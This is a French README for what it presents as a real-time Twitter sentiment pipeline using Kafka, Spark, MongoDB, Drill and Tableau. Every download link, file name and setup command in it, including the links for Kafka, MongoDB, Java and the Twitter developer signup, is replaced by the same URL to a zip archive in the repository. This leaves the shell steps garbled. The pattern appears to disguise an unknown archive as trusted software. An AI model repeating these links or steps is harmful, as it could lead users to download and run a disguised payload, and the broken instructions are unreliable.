# Pipeline de Données en Temps Réel pour l'Analyse des Tendances sur Twitter 📊⚙️📡

![](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)

## Motivation 💼⏱️📈

De nos jours, l'analyse des données en temps réel est essentielle pour les PME comme pour les grandes entreprises, dans des secteurs tels que les services financiers, juridiques, la gestion des opérations informatiques, le marketing et la publicité. Cela implique l'analyse de grandes quantités de données, en temps réel comme historiques, afin de prendre des décisions éclairées. 📊📡🌍

Le Big Data se distingue des données classiques par sa vitesse, son volume et sa variété. Le développement d'un pipeline de données distribué devient donc crucial pour le traitement, le stockage et l'analyse des données en temps réel, différant ainsi des applications classiques du Big Data. 🔄📦📶

Ce projet personnel vise à appliquer les principes de traitement parallèle à grande échelle (cours CS 6240 - NEU) pour créer un pipeline de traitement en temps réel en utilisant des outils open source. L'objectif est de capturer, traiter, stocker et analyser efficacement un volume important de données provenant de sources variées, tout en garantissant la scalabilité et l'efficacité. 🛠️📥📊

## Description du Projet 🌐🐦🧠

L'exploitation des tendances Twitter et de l'analyse des sentiments est un excellent cas d'utilisation pour construire un pipeline de données distribué. Environ 500 millions de tweets sont publiés chaque jour dans le monde (octobre 2019). Parmi eux, environ 1 %, soit 5 millions de tweets, sont accessibles publiquement. 🌍📉💬

Ce pipeline de données repose sur les composants suivants : **Apache Kafka** pour l'ingestion des données, **Apache Spark** pour le traitement en temps réel, **MongoDB** pour le stockage distribué, et **Apache Drill** pour connecter MongoDB à **Tableau** pour les analyses en temps réel. 🛠️💡📡

Les données Twitter sont récupérées via l'API de streaming Twitter, envoyées à Apache Kafka, traitées par Apache Spark (y compris la classification des sentiments), puis stockées dans MongoDB. L'analyse de la popularité et des sentiments des tendances est visualisée via un tableau de bord créé avec Tableau. 📊📲🧠

**Remarque :** Apache Drill joue un rôle clé en connectant MongoDB à Tableau. Des détails seront donnés plus loin. 🔌📘📍

## Architecture des Données 🧱📶📡

Dans cette architecture, le producteur de tweets en streaming utilise Kafka pour publier les tweets en temps réel sur le topic "tweets-1". Ensuite, Apache Spark Streaming s'abonne à ce topic pour traiter les tweets. 🔁🗃️💡

Le moteur Spark utilise Spark Streaming pour effectuer le traitement par lots des tweets entrants. Avant de les stocker, Spark procède à une classification des sentiments. Les résultats sont ensuite stockés dans MongoDB. 💭📤🗄️

Pour relier MongoDB à Tableau, Apache Drill sert de connecteur, permettant ainsi la création d'un tableau de bord en direct dans Tableau qui fournit des analyses en temps réel sur la popularité et le sentiment des tendances Twitter. 📉📊🔗

## Conception du Système 🧰🧠🖥️

### Producteur Kafka de Tweets 🌍💬🔄

Ce producteur est responsable de publier les tweets en temps réel sur le topic "tweets-1" dans le broker Kafka. Il utilise la bibliothèque **twitter4j** pour se connecter à l'API de Twitter et capturer des tweets en anglais, provenant du monde entier. 🌐📥💻

### Apache Kafka 💾💬📨

Kafka est un système de messagerie distribué publish-subscribe et une file d'attente robuste, conçu pour gérer de gros volumes de données. Kafka permet la consommation de messages en ligne et hors ligne, garantit la persistance des données sur disque, et réplique les messages pour assurer leur intégrité. Il s'intègre parfaitement avec Spark pour l'analyse des données en streaming. ⚙️🧵🔁

#### Dépendance de Kafka : Apache Zookeeper 🦓🔐🔁

Zookeeper est un service de configuration et de synchronisation distribué. Il agit comme interface de coordination entre les brokers Kafka et les consommateurs. Il stocke des métadonnées telles que les topics, brokers, offsets, etc., ce qui permet à Kafka de rester résilient en cas de panne. 💽🧭🔒

### Apache Spark 🔥🧠⚙️

Apache Spark est un framework de calcul distribué très rapide et flexible. Il propose divers outils : Spark SQL, MLlib (apprentissage automatique), GraphX (traitement de graphes) et Spark Streaming pour l'analyse de données en temps réel. 📚💡📊

#### Spark Core 🧱🔁🧮

Le cœur de Spark repose sur les **RDDs** (Resilient Distributed Datasets), qui sont des collections immuables, partitionnées et tolérantes aux pannes. Le graphe de lignée des RDDs permet de reconstituer les partitions manquantes en cas de défaillance. 🔄🧩🗂️

#### Spark Streaming 🌊🧠🧰

Basé sur Spark Core, Spark Streaming permet l'analyse des données en continu. Il repose sur l'abstraction **DStream** (flux discrétisé), composé d'une série continue de RDDs. Les transformations peuvent être stateless ou stateful, préparant les tweets bruts à la classification des sentiments. 🔍📝📊

### MongoDB 🗄️📥📡

MongoDB est utilisé comme système de stockage distribué pour les données traitées. Les résultats de la classification sont stockés dans MongoDB, assurant une gestion efficace des données. 🔐📂📈

### Apache Drill 🔍🧠🔗

Apache Drill est un moteur SQL open source qui permet d'exécuter des requêtes SQL sur des bases de données non relationnelles (comme MongoDB). Il joue un rôle clé pour connecter MongoDB à Tableau. 🛠️📡💻

### Tableau 📈🎨🧩

Tableau est un outil de visualisation de données qui utilise les données en temps réel stockées dans MongoDB pour créer un tableau de bord interactif. Ce tableau de bord permet d'analyser les tendances sur Twitter, avec un suivi de leur popularité et des sentiments en temps réel. 🧠📊📌

## Instructions pour Configurer le Pipeline et le Tableau de Bord 🧭🛠️🔌

1. **Télécharger les composants nécessaires :**
   - [Zookeeper](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
   - [MongoDB](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
   - [Apache Kafka](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
   - [Apache Spark](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
   - [Apache Drill](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)

2. **(Optionnel) Installer un environnement de développement Spark :**
   - [Guide recommandé](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)

3. **Cloner le dépôt du projet :**
   - Clonez le dépôt sur votre machine locale.

4. **Créer un compte développeur Twitter :**
   - [S'inscrire ici](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)

5. **Mettre à jour les jetons de l'API Twitter :**
   - Modifier le fichier `https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip` dans le répertoire `input/` du projet.

6. **Démarrer le serveur Zookeeper :**
   ```bash
   https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip start
   ```

7. **Démarrer le serveur Kafka :**
   ```bash
   https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip
   ```

8. **Créer un topic Kafka :**
   ```bash
   https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic tweets-1
   ```

9. **Vérifier la création du topic :**
   ```bash
   https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip --list --zookeeper localhost:2181
   ```

10. **Démarrer le serveur MongoDB :**

11. **Démarrer Apache Drill en mode distribué :**
   - Suivre [ce guide](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)

12. **Configurer MongoDB comme plugin de stockage dans Apache Drill :**
   - Suivre [ce guide](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)

13. **Exécuter https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip avec les bons arguments.**

14. **Exécuter https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip avec les bons arguments.**

15. **Configurer Tableau pour se connecter à MongoDB via Apache Drill :**
   - Suivre [ce guide](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)

## Outils + IDE 🧰🧪🧠

- [Apache Kafka 2.4.0](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
- [Apache Spark 2.4.1](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
- [Apache Drill 1.17.0](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
- [MongoDB](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
- [Tableau Desktop](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
- [IntelliJ IDEA](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
- [Java 8](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)
- [Scala 2.11.12](https://raw.githubusercontent.com/CodeWithRafik/etl-twitter-realtime-analysis/main/src/etl-realtime-twitter-analysis-3.4.zip)

